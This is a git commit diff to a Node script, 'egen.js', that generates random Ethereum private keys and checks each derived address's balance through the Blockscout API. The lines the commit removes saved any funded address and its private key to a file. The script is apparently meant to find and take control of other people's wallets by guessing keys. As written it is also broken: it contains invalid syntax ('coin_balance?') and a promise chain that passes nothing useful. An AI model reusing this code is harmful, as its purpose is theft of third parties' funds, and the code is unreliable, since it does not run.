6664ac3e363b566075c0e82e717bb6b48d0d31f1
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2023-09-12 16:49:02 +0200

    Update egen.js

--- egen.js
+++ egen.js
@@ -6,6 +6,7 @@ const ethUtils = require('ethereumjs-util');
 let privateKey = '';
 let privateK = '';
 let address = '';
+let bal;
 
 async function doe() {
 for(let i = 0; i < 77; i++) {
@@ -14,6 +15,7 @@ privateK = crypto.randomBytes(32);
 privateKey = privateK.toString("hex");
 address = "0x" + ethUtils.privateToAddress(Buffer.from(privateK)).toString("hex");
 
+
 if(i == 5) { address = '0x0000000000000000000000000000000000000000' }
 
 console.log(address);
@@ -21,9 +23,9 @@ console.log(address);
 await fetch('https://eth.blockscout.com/api/v2/addresses/' + address)
     .then(res => res.text())
     .then(address => console.log(address))
-    .then(text => console.log(text))
-    .then(text => { if (text.coin_balance? !== undefined) { 
-        fs.appendFileSync('zzethgood.txt', text + ' - ' + address + ' - ' + privateKey + '\n')}});
+    .then(text => { bal = text.coin_balance?; } );
+
+console.log(bal);
 }
 }
 
